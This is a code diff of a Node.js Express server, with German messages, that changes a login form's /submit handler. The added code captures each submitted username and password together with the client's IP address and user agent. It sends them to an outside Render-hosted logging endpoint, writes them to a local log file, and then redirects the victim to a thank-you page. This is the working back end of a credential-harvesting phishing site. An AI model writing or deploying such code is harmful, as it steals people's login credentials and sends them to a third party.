@@ -1,6 +1,8 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const path = require('path');
+const fs = require('fs');
+const fetch = require('node-fetch');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -8,16 +10,44 @@ const PORT = process.env.PORT || 3000;
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-app.post('/submit', (req, res) => {
-  console.log("🔁 POST /submit wurde aufgerufen");
-  console.log("Formulardaten:", req.body);
+app.post('/submit', async (req, res) => {
+  try {
+    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const { username, password } = req.body;
 
-  const { username, password } = req.body;
+    const logData = {
+      timestamp: new Date().toISOString(),
+      ip: clientIp,
+      userAgent: req.headers['user-agent'],
+      username: username,
+      password: password
+    };
 
-  console.log("👤 Benutzername erhalten:", username);
-  console.log("🔑 Passwort erhalten:", password);
+  
+    const renderResponse = await fetch('https://dein-render-service.onrender.com/api/log', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: username,
+        password: password,
+        clientIp: clientIp
+      })
+    });
 
-  res.redirect('/danke.html');
+    if (!renderResponse.ok) throw new Error('Render antwortete mit Fehler');
+
+    fs.appendFile('submissions.log', JSON.stringify(logData) + '\n', (err) => {
+      if (err) console.error("Log-Fehler:", err);
+    });
+
+    console.log("👤 Benutzername erhalten:", username);
+    console.log("🔑 Passwort erhalten:", password);
+    res.redirect('/danke.html');
+
+  } catch (error) {
+    console.error("❌ Fehler:", error);
+    res.status(500).send("Serverfehler");
+  }
 });
 
 app.listen(PORT, () => {
